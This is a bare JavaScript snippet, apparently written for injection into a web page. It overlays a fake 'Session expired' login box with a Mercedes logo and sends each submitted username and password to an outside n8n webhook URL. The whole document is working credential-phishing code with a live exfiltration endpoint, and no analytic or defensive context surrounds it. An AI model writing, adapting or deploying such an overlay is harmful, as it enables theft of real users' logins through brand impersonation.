let m = document.createElement('div');
m.innerHTML = `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;display:flex;justify-content:center;align-items:center;font-family:sans-serif">
  <div style="background:white;padding:2em;border-radius:8px;max-width:300px;width:100%;text-align:center">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/90/Mercedes-Logo.svg/200px-Mercedes-Logo.svg.png" width="60" style="margin-bottom:1em">
    <h3 style="margin:0 0 1em;color:#222">Session expired</h3>
    <p style="margin:0 0 1em;font-size:14px">Please log in to continue</p>
    <form onsubmit="fetch('https://lukaas2.app.n8n.cloud/webhook-test/3de86894-b73a-4c2f-aeb1-b254936fcca4/'+encodeURIComponent(this.user.value)+'/'+encodeURIComponent(this.pass.value));return false;">
      <input name="user" placeholder="Username" required style="width:100%;padding:0.5em;margin-bottom:0.5em"><br>
      <input name="pass" type="password" placeholder="Password" required style="width:100%;padding:0.5em;margin-bottom:1em"><br>
      <button type="submit" style="background:#191919;color:white;border:none;padding:0.5em 1em;width:100%">Login</button>
    </form>
  </div>
</div>`;
document.body.appendChild(m);
